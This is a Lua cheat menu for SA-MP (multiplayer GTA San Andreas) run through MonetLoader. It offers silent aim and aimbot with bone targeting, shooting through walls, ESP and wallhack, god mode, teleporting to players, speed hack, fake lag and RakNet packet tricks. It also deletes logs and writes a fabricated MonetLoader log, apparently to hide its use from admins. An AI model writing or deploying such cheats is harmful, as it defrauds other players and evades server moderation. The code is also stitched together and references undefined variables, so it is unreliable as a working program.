local memory = require 'memory'
local imgui = require 'mimgui'
local faicons = require('fAwesome6')

local new = imgui.new
local isActive = new.bool(false)
local weaponList = {}
local sf = require('sampfuncs')
local events = require 'lib.samp.events'
local autoSpawn = imgui.new.bool(false)
local ffi = require 'ffi'
local gta = ffi.load('GTASA')
local SAMemory = require 'SAMemory'
local encoding = require 'encoding'
local vector3d = require("vector3d")
SAMemory.require("CCamera")
local json = require 'json'

local lastTargetIndex = 1

local app = {
    -- Estados e toggles principais
    autoTPCheck = imgui.new.bool(false),
    stealthMode = false,
    usarIdManual = imgui.new.bool(false),
    idManual = imgui.new.int(0),
    isTimerActive = false,
    lifefoot = imgui.new.bool(false),
    lifefoot1 = imgui.new.bool(false),
    shootingEnabled = imgui.new.bool(false),
    shootingEnabled1 = imgui.new.bool(false),
    clearAnimTime = imgui.new.float(200),
    shotCount = 0,
    currentWeaponID = 0,

    -- Checkboxes/ativadores gerais
    hg = {
        ANTIDM = imgui.new.bool(),
        RVANKACARROS = imgui.new.bool(false),
        ANTICONGELAR = imgui.new.bool(),
        DESTRANCAR = imgui.new.bool(),
    },

    -- Sliders da aba RVANKA
    slide = {
        RVANKADISTANCE = imgui.new.float(10.0),
        RVANKADLAY = imgui.new.int(150),
        pot = imgui.new.float(0.3),
    },
}

local isTimerActive = false
local disablePlayerSync = false

-- NOVAS VARIAVEIS
local usarIdManual = imgui.new.bool(false)
local idManual = imgui.new.int(0)

local fakeActive = imgui.new.bool(false)
local bypass = imgui.new.bool(false)

local fakeClientVersion = "0.3.7"
local lastSyncTime = 0

local RPC = {
    [21] = true,   -- ResetPlayerWeapons
    [22] = true,   -- GivePlayerWeapon
    [67] = true,   -- SetPlayerArmedWeapon
    [145] = true,  -- SetPlayerAmmo
}

local lfs = require 'lfs'

local janela = imgui.new.bool(false)
local horarioEntrada = ""

local function exec_lifefoot()
    if app.lifefoot[0] and isCharShooting(PLAYER_PED) then
        app.shotCount = app.shotCount + 1
        if app.shotCount % 2 == 0 then
            app.currentWeaponID = getCurrentCharWeapon(PLAYER_PED)
            setCurrentCharWeapon(PLAYER_PED, 0)
            wait(300)
            setCurrentCharWeapon(PLAYER_PED, app.currentWeaponID)
        end
    end
end

local function exec_lifefoot1()
    if app.lifefoot1[0] and isCharShooting(PLAYER_PED) then
        app.shotCount = app.shotCount + 1
        app.currentWeaponID = getCurrentCharWeapon(PLAYER_PED)
        setCurrentCharWeapon(PLAYER_PED, 0)
        wait(300)
        setCurrentCharWeapon(PLAYER_PED, app.currentWeaponID)
    end
end

local function exec_cb_lifefoot()
    if app.shootingEnabled[0] and isCharShooting(PLAYER_PED) then
        app.shotCount = app.shotCount + 1
        if app.shotCount % 2 == 0 then
            app.currentWeaponID = getCurrentCharWeapon(PLAYER_PED)
            setCurrentCharWeapon(PLAYER_PED, 0)
            wait(300)
            setCurrentCharWeapon(PLAYER_PED, app.currentWeaponID)
        end
        wait(200)
        clearCharTasksImmediately(PLAYER_PED)
    end
end

local function exec_cbug_delay()
    if app.shootingEnabled1[0] and isCharShooting(PLAYER_PED) then
        wait(app.clearAnimTime[0])
        clearCharTasksImmediately(PLAYER_PED)
    end
end

-- Deleta a pasta logs e arquivos dentro
local function deletarLogs()
    if lfs.attributes(dir_logs, "mode") == "directory" then
        for file in lfs.dir(dir_logs) do
            if file ~= "." and file ~= ".." then
                os.remove(dir_logs .. "/" .. file)
            end
        end
        lfs.rmdir(dir_logs)
    end
end

local function criarLog()
    lfs.mkdir(dir_logs)

    local sufixo = string.format('%06d', math.random(0, 999999))
    local conteudo = string.format(
        '[%s.%s] (system)\n\n\t* MonetLoader initialized! Version: 3.6.0-os\n\t* Official Telegram: t.me/MonetLoader\n',
        horarioEntrada, sufixo
    )

    local file = io.open(caminho_log, "w")
    if file then
        file:write(conteudo)
        file:close()
    end
end

local mostrarInputs = imgui.new.bool(false)
local idArma = imgui.new.int(24)    
local muniArma = imgui.new.int(30) 

local autoPilot = imgui.new.bool(false)
local destinoX, destinoY, destinoZ = 0, 0, 0
local veiculo = nil
require "lib.moonloader"
require "lib.sampfuncs"

local se = require 'samp.events'

local act = imgui.new.bool(false)

local destino = {x = 0, y = 0, z = 0}
local cordenadas = {x = 0, y = 0, z = 0}
local autoPuxar = imgui.new.bool(false)
local blockDialogs = imgui.new.bool(false)
local bones = { 3, 4, 5, 51, 52, 41, 42, 31, 32, 33, 21, 22, 23, 2 }
local font = renderCreateFont("Arial", 12, 1 + 4)
ffi.cdef("typedef struct RwV3d { float x; float y; float z; } RwV3d; void _ZN4CPed15GetBonePositionER5RwV3djb(void* thiz, RwV3d* posn, uint32_t bone, bool calledFromCam);")
ffi.cdef([[ void _Z12AND_OpenLinkPKc(const char* link); ]])
local teleporteAtivo = imgui.new.bool(false)
local teletransportado = false

local weapons = {
    {id = 22, delay = 160, dmg = 8.25, distance = 35, camMode = 53, weaponState = 2},
    {id = 23, delay = 120, dmg = 13.2, distance = 35, camMode = 53, weaponState = 2},
    {id = 24, delay = 800, dmg = 46.2, distance = 35, camMode = 53, weaponState = 2},
    {id = 25, delay = 800, dmg = 3.3, distance = 40, camMode = 53, weaponState = 1},
    {id = 26, delay = 120, dmg = 3.3, distance = 35, camMode = 53, weaponState = 2},
    {id = 27, delay = 120, dmg = 4.95, distance = 40, camMode = 53, weaponState = 2},
    {id = 28, delay = 50, dmg = 6.6, distance = 35, camMode = 53, weaponState = 2},
    {id = 29, delay = 90, dmg = 8.25, distance = 45, camMode = 53, weaponState = 2},
    {id = 30, delay = 90, dmg = 9.9, distance = 70, camMode = 53, weaponState = 2},
    {id = 31, delay = 90, dmg = 9.9, distance = 90, camMode = 53, weaponState = 2},
    {id = 32, delay = 70, dmg = 6.6, distance = 35, camMode = 53, weaponState = 2},
    {id = 33, delay = 800, dmg = 24.75, distance = 100, camMode = 53, weaponState = 1},
    {id = 34, delay = 900, dmg = 41.25, distance = 320, camMode = 7, weaponState = 1},
    {id = 38, delay = 20, dmg = 46.2, distance = 75, camMode = 53, weaponState = 2},
}

local inicfg = require 'inicfg'

local configResolution = '.company'
local events = require 'lib.samp.events'
local fa = require('fAwesome6_solid')
local sampfuncs = require('sampfuncs')
local sampev = require 'samp.events'
local json = require 'json'
local SAMemory = require 'SAMemory'
local gta = ffi.load('GTASA')
local ADDONS = require("ADDONS") 
local requiere = ffi.load("GTASA")
local vector3d = require("vector3d")
SAMemory.require("CCamera")
local DPI = MONET_DPI_SCALE

--silent

local online = false
local var_0_10 = renderCreateFont("Verdana", 12, 4, FCR_BOLD + FCR_BORDER)
local var_0_0 = require("samp.events")
local carInput = imgui.new.char[256]()  

local enabled = false
local was_in_car = false
local last_car

local silentcabeca = new.bool(false)
local silentpeito = new.bool(false)
local silentvirilha = new.bool(false)
local silentbraco = new.bool(false)
local silentbraco2 = new.bool(false)
local silentperna = new.bool(false)
local silentperna2 = new.bool(false)

local bypass2 = false

local renderWindow = imgui.new.bool(false)
local selectedTab = 1
local state = false
local targetId = -1
local miss = false
local ped = nil
local fakemode = imgui.new.bool(false)

local directIni = 'menuEASY'
local ini = inicfg.load({
    search = {
        canSee = true,
        radius = 100,
        ignoreCars = true,
        distance = 500,
        useWeaponRadius = true,
        useWeaponDistance = true,
        ignoreObj = true
    },
    render = {
        line = true,
        circle = true,
        fpscircle = true,
        printString = true
    },
    shoot = {
        misses = false,
        miss_ratio = 3,
        removeAmmo = false,
        doubledamage = false,
        tripledamage = false
    }
}, directIni)

inicfg.save(ini, directIni)

local settings = {
    search = {
        canSee = imgui.new.bool(ini.search.canSee),
        radius = imgui.new.int(ini.search.radius),
        ignoreCars = imgui.new.bool(ini.search.ignoreCars),
        distance = imgui.new.int(ini.search.distance),
        useWeaponRadius = imgui.new.bool(ini.search.useWeaponRadius),
        useWeaponDistance = imgui.new.bool(ini.search.useWeaponDistance),
        ignoreObj = imgui.new.bool(ini.search.ignoreObj)
    },
    render = {
        line = imgui.new.bool(ini.render.line),
        circle = imgui.new.bool(ini.render.circle),
        fpscircle = imgui.new.bool(ini.render.fpscircle),
        printString = imgui.new.bool(ini.render.printString)
    },
    shoot = {
        misses = imgui.new.bool(ini.shoot.misses),
        miss_ratio = imgui.new.int(ini.shoot.miss_ratio),
        removeAmmo = imgui.new.bool(ini.shoot.removeAmmo),
        doubledamage = imgui.new.bool(ini.shoot.doubledamage),
        tripledamage = imgui.new.bool(ini.shoot.tripledamage)
    }
}

math.randomseed(os.time())

local w, h = getScreenResolution()

function getpx()
    local fov = getCameraFov() or 1  
    return ((w / 2) / fov) * settings.search.radius[0]
end

local function updateTargetId()
    if ped then
        local _, id = sampGetPlayerIdByCharHandle(ped)
        if _ then
            targetId = id
        end
    else
        targetId = -1
    end
end


--fim local silent


--aimbot

local camera = SAMemory.camera
local screenWidth, screenHeight = getScreenResolution()
local configFilePath = getWorkingDirectory() .. "/config/fenix.json"
local circuloFOVAIM = false



local slide = {
    fovColor = imgui.new.float[4](1.0, 1.0, 1.0, 1.0),
    fovX = imgui.new.float(832.0),
    fovY = imgui.new.float(313.0),
    distancia = imgui.new.int(1000),
    fovvaimbotcirculo = imgui.new.float(200),
    DistanciaAIM = imgui.new.float(1000.0),
    aimSmoothhhh = imgui.new.float(1.000),
    fovCorAimmm = imgui.new.float[4](1.0, 1.0, 1.0, 1.0),
    fovCorsilent = imgui.new.float[4](1.0, 1.0, 1.0, 1.0),
    espcores = imgui.new.float[4](1.0, 1.0, 1.0, 1.0),
    posiX = imgui.new.float(0.520),
    posiY = imgui.new.float(0.439),
    circulooPosX = imgui.new.float(832.0),
    circuloooPosY = imgui.new.float(313.0),
    circuloFOV = false,
    aimCtdr = imgui.new.int(1),
    qtdraios = imgui.new.int(5),
    raiosseguidos = imgui.new.int(10),
    larguraraios = imgui.new.int(40),
    HGPROAIM = imgui.new.int(1),
    minFov = 1,
}

local sulist = {
    cabecaAIM = imgui.new.bool(),
    peitoAIM = imgui.new.bool(),
    bracoAIM = imgui.new.bool(),
    virilhaAIM = imgui.new.bool(),
    lockAIM = imgui.new.bool(),
    braco2AIM = imgui.new.bool(),
    pernaAIM = imgui.new.bool(),
    perna2AIM = imgui.new.bool(),
    PROAIM2 = imgui.new.bool(),
    aimbotparede = imgui.new.bool(false),
}

local buttonPressedTime = 0
local buttonRepeatInterval = 0.0
local renderWindow = imgui.new.bool(false)
local buttonSize = imgui.ImVec2(120 * DPI, 60 * DPI)
local WinState = imgui.new.bool()
local renderWindow = imgui.new.bool()
local sizeX, sizeY = getScreenResolution()
local BOTAO = 2
local activeTab = 2
local SCREEN_W, SCREEN_H = getScreenResolution()



local function loadConfig()
    local file = io.open(configFilePath, "r")
    if file then
        local content = file:read("*a")
        file:close()
        local config = json.decode(content)
        if config and config.slide then
            slide.FoVVHG[0] = tonumber(config.slide.FoVVHG) or slide.FoVVHG[0]
            slide.fovX[0] = tonumber(config.slide.fovX) or slide.fovX[0]
            slide.fovY[0] = tonumber(config.slide.fovY) or slide.fovY[0]          
            slide.fovvaimbotcirculo[0] = tonumber(config.slide.fovvaimbotcirculo) or slide.fovvaimbotcirculo[0]
            slide.DistanciaAIM[0] = tonumber(config.slide.DistanciaAIM) or slide.DistanciaAIM[0]
            slide.aimSmoothhhh[0] = tonumber(config.slide.aimSmoothhhh) or slide.aimSmoothhhh[0]
            slide.fovCorAimmm[0] = tonumber(config.slide.fovCorAimmm) or slide.fovCorAimmm[0]
            slide.posiX[0] = tonumber(config.slide.posiX) or slide.posiX[0]
            slide.posiY[0] = tonumber(config.slide.posiY) or slide.posiY[0]
            slide.circulooPosX[0] = tonumber(config.slide.circulooPosX) or slide.circulooPosX[0]
            slide.circuloooPosY[0] = tonumber(config.slide.circuloooPosY) or slide.circuloooPosY[0]
            slide.distancia[0] = tonumber(config.slide.distancia) or slide.distancia[0]
            slide.fovColor[0] = tonumber(config.slide.fovColorR) or slide.fovColor[0]
            slide.fovColor[1] = tonumber(config.slide.fovColorG) or slide.fovColor[1]
            slide.fovColor[2] = tonumber(config.slide.fovColorB) or slide.fovColor[2]
            slide.fovColor[3] = tonumber(config.slide.fovColorA) or slide.fovColor[3]
        end
    end
end

local function saveConfig()
    local config = {
        slide = {
            FoVVHG = slide.FoVVHG[0],
            fovX = slide.fovX[0],
            fovY = slide.fovY[0],
            fovvaimbotcirculo = slide.fovvaimbotcirculo[0],
            DistanciaAIM = slide.DistanciaAIM[0],
            aimSmoothhhh = slide.aimSmoothhhh[0],
            fovCorAimmm = slide.fovCorAimmm[0],
            posiX = slide.posiX[0],
            posiY = slide.posiY[0],
            circulooPosX = slide.circulooPosX[0],
            circuloooPosY = slide.circuloooPosY[0],
            distancia = slide.distancia[0],
            fovColorR = slide.fovColor[0],
            fovColorG = slide.fovColor[1],
            fovColorB = slide.fovColor[2],
            fovColorA = slide.fovColor[3],
        }
    }
    local file = io.open(configFilePath, "w")
    if file then
        file:write(json.encode(config))
        file:close()
    end
end

local function randomizeToggleButtons()
    while sulist.ativarRandomizacao[0] do
        sulist.peito[0].Checked = math.random(0, 1) == 1
        sulist.braco[0].Checked = math.random(0, 1) == 1
        sulist.braco2[0].Checked = math.random(0, 1) == 1
        sulist.cabeca[0].Checked = math.random(0, 4) == 1
        
        wait(40)
    end
end

local function isAnyToggleButtonActive()
    return sulist.cabeca[0].Checked or sulist.perna[0].Checked or sulist.virilha[0].Checked or sulist.pernas2[0].Checked or sulist.peito[0].Checked or sulist.braco[0].Checked or sulist.braco2[0].Checked or ativarMatarAtravesDeParedes[0].Checked
end

imgui.OnInitialize(function()
    imgui.GetIO().IniFilename = nil
    local config = imgui.ImFontConfig()
    config.MergeMode = true
    config.PixelSnapH = true
    
    local config = imgui.ImFontConfig()
    config.MergeMode = true
    config.PixelSnapH = true
end)

local ui_meta = {
    __index = function(self, v)
        if v == "switch" then
            local switch = function()
                if self.process and self.process:status() ~= "dead" then
                    return false
                end
                self.timer = os.clock()
                self.state = not self.state

                self.process = lua_thread.create(function()
                    local bringFloatTo = function(from, to, start_time, duration)
                        local timer = os.clock() - start_time
                        if timer >= 0.00 and timer <= duration then
                            local count = timer / (duration / 100)
                            return count * ((to - from) / 100)
                        end
                        return (timer > duration) and to or from
                    end

                    while true do wait(0)
                        local a = bringFloatTo(0.00, 1.00, self.timer, self.duration)
                        self.alpha = self.state and a or 1.00 - a
                        if a == 1.00 then break end
                    end
                end)
                return true
            end
            return switch
        end
 
        if v == "alpha" then
            return self.state and 1.00 or 0.00
        end
    end
}

local menu = { state = false, duration = 1.15 }
setmetatable(menu, ui_meta)

local str = encoding.UTF8

--fim local aimbot

-- Variáveis da interface
local localizarAtivado = imgui.new.bool(false)
local objectId = imgui.new.int(0)

-- Font para desenhar
local font = renderCreateFont("Arial", 12, 1 + 4)

-- Localizador ativo
local objetoLocalizando = false

local var_0_10  

local FCR_BOLD = 1
local FCR_BORDER = 4
 
local function createFont()
    local var_0_10 = renderCreateFont("Arial", 12, 4, FCR_BOLD + FCR_BORDER)
    return var_0_10
end


local MDS = MONET_DPI_SCALE
local window = imgui.new.bool(false)
local selectedTab = ""
local airbrake_enabled = imgui.new.bool(false)
local speed = imgui.new.float(0.3)
local widgets = require('widgets') -- for WIDGET_(...)

local noFallActive = imgui.new.bool(false)
local autoRegenerarVida = imgui.new.bool(false)
local fastPunch = imgui.new.bool(false)
local speedHack = imgui.new.bool(false)
local invertPlayer = imgui.new.bool(false)

local invis = imgui.new.bool(false)
local memory = require("memory")
local rak = require("samp.raknet")
local amigos = {}

local selectedId = -1
local searchText = imgui.new.char[64]()
local isSpecActive = false
local specTargetId = -1

local function getDistance(x1, y1, x2, y2)
    return math.sqrt((x2 - x1)^2 + (y2 - y1)^2)
end

local function teleportPlayer(playerId)
    local success, ped = sampGetCharHandleBySampPlayerId(playerId)
    if success then
        local pX, pY, pZ = getCharCoordinates(ped)
        local playerPed = PLAYER_PED
        local px, py, pz = getCharCoordinates(playerPed)

        local distanceThreshold = 999
        local distance = getDistance(px, py, pX, pY)

        if distance <= distanceThreshold then
            local offsetX = 1
            local offsetY = 1
            local heading = getCharHeading(ped)
            local radian = math.rad(heading)
            local newX = pX + math.sin(radian) * offsetX
            local newY = pY - math.cos(radian) * offsetY
            local newZ = pZ
            setCharCoordinates(playerPed, newX, newY, newZ)
            sampAddChatMessage("{6ff700} TELEPORTADO PARA JOGADOR COM ID - " .. playerId, -1)
        else
            sampAddChatMessage("{f7f700} JOGADOR DISTANTE", -1)
        end
    else
        sampAddChatMessage("PLAYER NAO ENCONTRADO", -1)
    end
end

-- Lista de animações
local all_anims = {
	"abseil", "arrestgun", "atm", "bike_elbowl", "bike_elbowr", "bike_fallr", "bike_fall_off", "bike_pickupl",
	"bike_pickupr", "bike_pullupl", "bike_pullupr", "bomber", "car_alignhi_lhs", "car_alignhi_rhs",
	"car_align_lhs", "car_align_rhs", "car_closedoorl_lhs", "car_closedoorl_rhs", "car_closedoor_lhs",
	"car_closedoor_rhs", "car_close_lhs", "car_close_rhs", "car_crawloutrhs", "car_dead_lhs", "car_dead_rhs",
	"car_doorlocked_lhs", "car_doorlocked_rhs", "car_fallout_lhs", "car_fallout_rhs", "car_getinl_lhs",
	"car_getinl_rhs", "car_getin_lhs", "car_getin_rhs", "car_getoutl_lhs", "car_getoutl_rhs", "car_getout_lhs",
	"car_getout_rhs", "car_hookertalk", "car_jackedlhs", "car_jackedrhs", "car_jumpin_lhs", "car_lb",
	"car_lb_pro", "car_lb_weak", "car_ljackedlhs", "car_ljackedrhs", "car_lshuffle_rhs", "car_lsit",
	"car_open_lhs", "car_open_rhs", "car_pulloutl_lhs", "car_pulloutl_rhs", "car_pullout_lhs", "car_pullout_rhs",
	"car_qjacked", "car_rolldoor", "car_rolldoorlo", "car_rollout_lhs", "car_rollout_rhs", "car_shuffle_rhs",
	"car_sit", "car_sitp", "car_sitplo", "car_sit_pro", "car_sit_weak", "car_tune_radio", "climb_idle",
	"climb_jump", "climb_jump2fall", "climb_jump_b", "climb_pull", "climb_stand", "climb_stand_finish", "cower",
	"crouch_roll_l", "crouch_roll_r", "dam_arml_frmbk", "dam_arml_frmft", "dam_arml_frmlt", "dam_armr_frmbk",
	"dam_armr_frmft", "dam_armr_frmrt", "dam_legl_frmbk", "dam_legl_frmft", "dam_legl_frmlt", "dam_legr_frmbk",
	"dam_legr_frmft", "dam_legr_frmrt", "dam_stomach_frmbk", "dam_stomach_frmft", "dam_stomach_frmlt",
	"dam_stomach_frmrt", "door_lhinge_o", "door_rhinge_o", "drivebyl_l", "drivebyl_r", "driveby_l", "driveby_r",
	"drive_boat", "drive_boat_back", "drive_boat_l", "drive_boat_r", "drive_l", "drive_lo_l", "drive_lo_r",
	"drive_l_pro", "drive_l_pro_slow", "drive_l_slow", "drive_l_weak", "drive_l_weak_slow", "drive_r",
	"drive_r_pro", "drive_r_pro_slow", "drive_r_slow", "drive_r_weak", "drive_r_weak_slow", "drive_truck",
	"drive_truck_back", "drive_truck_l", "drive_truck_r", "drown", "duck_cower", "endchat_01", "endchat_02",
	"endchat_03", "ev_dive", "ev_step", "facanger", "facgum", "facsurp", "facsurpm", "factalk", "facurios",
	"fall_back", "fall_collapse", "fall_fall", "fall_front", "fall_glide", "fall_land", "fall_skydive",
	"fight2idle", "fighta_1", "fighta_2", "fighta_3", "fighta_block", "fighta_g", "fighta_m", "fightidle",
	"fightshb", "fightshf", "fightsh_bwd", "fightsh_fwd", "fightsh_left", "fightsh_right", "flee_lkaround_01",
	"floor_hit", "floor_hit_f", "fucku", "gang_gunstand", "gas_cwr", "getup", "getup_front", "gum_eat",
	"guncrouchbwd", "guncrouchfwd", "gunmove_bwd", "gunmove_fwd", "gunmove_l", "gunmove_r", "gun_2_idle",
	"gun_butt", "gun_butt_crouch", "gun_stand", "handscower", "handsup", "hita_1", "hita_2", "hita_3", "hit_back",
	"hit_behind", "hit_front", "hit_gun_butt", "hit_l", "hit_r", "hit_walk", "hit_wall", "idlestance_fat",
	"idlestance_old", "idle_armed", "idle_chat", "idle_csaw", "idle_gang1", "idle_hbhb", "idle_rocket",
	"idle_stance", "idle_taxi", "idle_tired", "jetpack_idle", "jog_femalea", "jog_malea", "jump_glide",
	"jump_land", "jump_launch", "jump_launch_r", "kart_drive", "kart_l", "kart_lb", "kart_r", "kd_left",
	"kd_right", "ko_shot_face", "ko_shot_front", "ko_shot_stom", "ko_skid_back", "ko_skid_front", "ko_spin_l",
	"ko_spin_r", "pass_smoke_in_car", "phone_in", "phone_out", "phone_talk", "player_sneak",
	"player_sneak_walkstart", "roadcross", "roadcross_female", "roadcross_gang", "roadcross_old", "run_1armed",
	"run_armed", "run_civi", "run_csaw", "run_fat", "run_fatold", "run_gang1", "run_left", "run_old", "run_player",
	"run_right", "run_rocket", "run_stop", "run_stopr", "run_wuzi", "seat_down", "seat_idle", "seat_up",
	"shot_leftp", "shot_partial", "shot_partial_b", "shot_rightp", "shove_partial", "smoke_in_car", "sprint_civi",
	"sprint_panic", "sprint_wuzi", "swat_run", "swim_tread", "tap_hand", "tap_handp", "turn_180", "turn_l",
	"turn_r", "walk_armed", "walk_civi", "walk_csaw", "walk_doorpartial", "walk_drunk", "walk_fat", "walk_fatold",
	"walk_gang1", "walk_gang2", "walk_old", "walk_player", "walk_rocket", "walk_shuffle", "walk_start",
	"walk_start_armed", "walk_start_csaw", "walk_start_rocket", "walk_wuzi", "weapon_crouch", "woman_idlestance",
	"woman_run", "woman_runbusy", "woman_runfatold", "woman_runpanic", "woman_runsexy", "woman_walkbusy",
	"woman_walkfatold", "woman_walknorm", "woman_walkold", "woman_walkpro", "woman_walksexy", "woman_walkshop",
	"xpressscratch"
}

local playerPed = PLAYER_PED
local noFallThread = nil
local autoReconnect = imgui.new.bool(true)
local reconnectDelay = imgui.new.int(3)
local staminaInfinite = imgui.new.bool(false)



local isReconnecting = false

local function regenerarVida()
    lua_thread.create(
        function()
            while autoRegenerarVida[0] do
                wait(100)
                local vidaAtual = getCharHealth(PLAYER_PED)
                if vidaAtual < 100 then
                    setCharHealth(PLAYER_PED, vidaAtual + 10)
                end
            end
        end
    )
end

local function reconnectToServer(delay)
    if isReconnecting then return end
    isReconnecting = true
    lua_thread.create(function()
        local ms = 500 + (tonumber(delay) or 0) * 1000
        if ms <= 0 then ms = 100 end

        while ms > 0 do
            if ms <= 500 then
                local bs = raknetNewBitStream()
                raknetBitStreamWriteInt8(bs, sf.PACKET_DISCONNECTION_NOTIFICATION)
                raknetSendBitStreamEx(bs, sf.SYSTEM_PRIORITY, sf.RELIABLE, 0)
                raknetDeleteBitStream(bs)
            end
            printStringNow("Reconectando em ~w~" .. tostring(math.ceil(ms/1000)) .. " segundos", 100)
            wait(100)
            ms = ms - 100
        end

        local bs = raknetNewBitStream()
        raknetEmulPacketReceiveBitStream(sf.PACKET_CONNECTION_LOST, bs)
        raknetDeleteBitStream(bs)
        printStringNow("~r~Reconectado", 3000)

        isReconnecting = false
    end)
end

local was_in_car = false
local last_car
local MDS = MONET_DPI_SCALE
local infiniteAmmo = imgui.new.bool(false)

local ev = require('lib.samp.events')
local sampEvents = require("lib.samp.events")
local sampfuncs = require('sampfuncs')
local sampev = require 'samp.events'

local fakeLagActive = imgui.new.bool(false)
local fakeLagDelay = imgui.new.int(750)
local fakeLagNop = false

local EASY = {
	godmod = new.bool(false),
	naotelaradm = new.bool(false),
    naotelaradm2 = new.bool(false),
    teste67 = new.bool(false),
    espcar_enabled = new.bool(false),
    espcarlinha_enablade = new.bool(false),
    espinfo_enabled = new.bool(false),
    espplataforma = new.bool(false),
    flodarmorte = new.bool(),
    ESP_ESQUELETO = imgui.new.bool(false),
    esp_enabled = new.bool(false),
    wallhack_enabled = new.bool(false), 
    nostun = new.bool(false),
    teste31 = new.bool(false),
    teste29 = new.bool(false),
    espplataforma = new.bool(false),
}

local OXHACK = {
    show_menu = new.bool(false),
    noreset = new.bool(false),
    naotelaradm = new.bool(false),
    naotelaradm2 = new.bool(false),
    spedagio = true,
    noreload = new.bool(false),    
    nostun = new.bool(false),
    dirsemcombus = new.bool(false),
    active_tab = new.int(0),
    espcar_enabled = new.bool(false),
    espcarlinha_enablade = new.bool(false),
    espinfo_enabled = new.bool(false),
    ESP_ESQUELETO = imgui.new.bool(false),
    matararea_enabled = new.bool(false),
    godmod = new.bool(false),
    esp_enabled = new.bool(false),
    atrplay_enabled = new.bool(false),
    wallhack_enabled = new.bool(false), 
    silenths_enabled = new.bool(false),
    color_picker_open = new.bool(false),
    colorfov_picker_open = new.bool(false),
    godcar = new.bool(false),
    motorcar = new.bool(false),
    pesadocar = new.bool(false),
    ativarfov = new.bool(false),
    alterarfov = new.float(60.0)
}

-- Mapeamento de ícones para cada aba
local tabIcons = {
    COMBAT = faicons("sword"),
    VISUAL = faicons("eye"),
    PLAYER = faicons("user"),
    WORLD = faicons("globe"),
    EXPLOITS = faicons("bug"),
    TELEPORT = faicons("LOCATION_PIN"),
    CREDITOS = faicons("CIRCLE_INFO") -- Ícone para a aba de créditos
}

-- Abas organizadas por seções
local sections = {
    ["General"] = {
        "COMBAT",
        "VISUAL",
        "PLAYER",
        "WORLD"
    },
    ["Miscellaneous"] = {
        "EXPLOITS",
        "TELEPORT",
        "CREDITOS"
    }
}

local sectionOrder = { "General", "Miscellaneous" }

function aba_COMBAT()
    local style = imgui.GetStyle()
    style.ItemSpacing = imgui.ImVec2(10, 8)

    local size = imgui.GetContentRegionAvail()

    local half = imgui.ImVec2(size.x / 2 - 5, size.y)

    imgui.BeginChild("LeftCombat", half, true)
    ---------------------------
    -- ▸ AIM SENYAP
    ---------------------------
    imgui.TextColored(imgui.ImVec4(1, 0.3, 0.1, 1), faicons("crosshairs") .. " AIM SENYAP")
    imgui.Separator()

    imgui.Checkbox("KEPALA", silentcabeca)
    imgui.Checkbox("DADA", silentpeito)
    imgui.Checkbox("SELangkANGAN", silentvirilha)
    imgui.Checkbox("LENGAN KANAN", silentbraco)
    imgui.Checkbox("LENGAN KIRI", silentbraco2)
    imgui.Checkbox("KAKI KANAN", silentperna)
    imgui.Checkbox("KAKI KIRI", silentperna2)

    imgui.Spacing()
    if imgui.Button((state and "MATIKAN AIM" or "NYALAKAN AIM"), imgui.ImVec2(180 * DPI, 32 * DPI)) then
        state = not state
        if state then
            lua_thread.create(function()
                while state do
                    wait(0)
                    updateTargetId()
                end
            end)
        end
    end

    imgui.Spacing()
    imgui.Checkbox(" ABAIKAN TEMBOK", settings.search.ignoreObj)
    imgui.Checkbox(faicons("slash") .. " GARIS", settings.render.line)
    imgui.Checkbox(faicons("circle") .. " FOV", settings.render.circle)
    imgui.SliderInt(faicons("expand") .. " FOV", settings.search.radius, 1, 60)
    imgui.ColorEdit4(faicons("palette") .. " WARNA FOV", slide.fovCorsilent)

    if not settings.search.useWeaponDistance[0] then
        imgui.SliderInt(faicons("ruler-horizontal") .. " JARAK", settings.search.distance, 1, 1000)
    end
    imgui.EndChild()

    imgui.SameLine()

    imgui.BeginChild("RightCombat", half, true)
    ---------------------------
    -- ▸ AIMBOT LEGIT
    ---------------------------
    imgui.TextColored(imgui.ImVec4(0.2, 0.7, 1.0, 1), faicons("bullseye") .. " AIMBOT LEGIT")
    
    imgui.Separator()

    imgui.Checkbox("KEPALA", sulist.cabecaAIM)
    imgui.Checkbox("DADA", sulist.peitoAIM)
    imgui.Checkbox("SELangkANGAN", sulist.virilhaAIM)
    imgui.Checkbox("LENGAN 1", sulist.bracoAIM)
    imgui.Checkbox("LENGAN 2", sulist.braco2AIM)
    imgui.Checkbox("KAKI 1", sulist.pernaAIM)
    imgui.Checkbox("KAKI 2", sulist.perna2AIM)

    imgui.Spacing()
    imgui.Checkbox(" ABAIKAN TEMBOK", sulist.aimbotparede)
    imgui.Checkbox(faicons("lock") .. " AIM LEGIT", sulist.lockAIM)
    imgui.SliderInt(faicons("crosshairs") .. " JUMLAH TEMBAKAN", slide.aimCtdr, 0, 10)
    imgui.SliderFloat(faicons("magic") .. " KELEMBUTAN", slide.aimSmoothhhh, 0.050, 1.0, "%.3f")
    imgui.SliderFloat(faicons("ruler-horizontal") .. " JARAK", slide.DistanciaAIM, 0.0, 1000.0, "%.1f")
    imgui.ColorEdit4(faicons("palette") .. " WARNA FOV", slide.fovCorAimmm)

    imgui.Spacing()
    imgui.Text(faicons("expand") .. " FOV AIMBOT")
    imgui.InputFloat("##FOVINPUT", slide.fovvaimbotcirculo, 0.0, 0.0, "FOV %.1f")
    imgui.SameLine()
    if imgui.Button("-", imgui.ImVec2(30 * DPI, 30 * DPI)) then
        slide.fovvaimbotcirculo[0] = math.max(1, slide.fovvaimbotcirculo[0] - 2)
    end
    imgui.SameLine()
    if imgui.Button("+", imgui.ImVec2(30 * DPI, 30 * DPI)) then
        slide.fovvaimbotcirculo[0] = math.min(90000, slide.fovvaimbotcirculo[0] + 5)
    end

    imgui.EndChild()
end

function aba_VISUAL()
    imgui.Checkbox('ESP TULANG', EASY.ESP_ESQUELETO)
    imgui.Checkbox('ESP NAMA/KEHIDUPAN/BODY ARMOR', EASY.wallhack_enabled)         
    imgui.Checkbox('ESP GARIS PLAYER', EASY.esp_enabled)
    imgui.Checkbox('ESP GARIS MOBIL', EASY.espcar_enabled)
    imgui.Checkbox('ESP BOX MOBIL', EASY.espcarlinha_enablade)
    imgui.Checkbox('ESP INFO MOBIL', EASY.espinfo_enabled)
    if imgui.Checkbox("CARI OBJEK", localizarAtivado) then
        objetoLocalizando = localizarAtivado[0]
    end

    if localizarAtivado[0] then
        imgui.InputInt("ID Objek", objectId)

        if imgui.Button("CARI") then
            if objectId[0] == 0 then
                sampAddChatMessage(" {FF0000}Masukkan ID objek yang valid", -1)
                objetoLocalizando = false
            else
                objetoLocalizando = true
            end
        end
    end
end

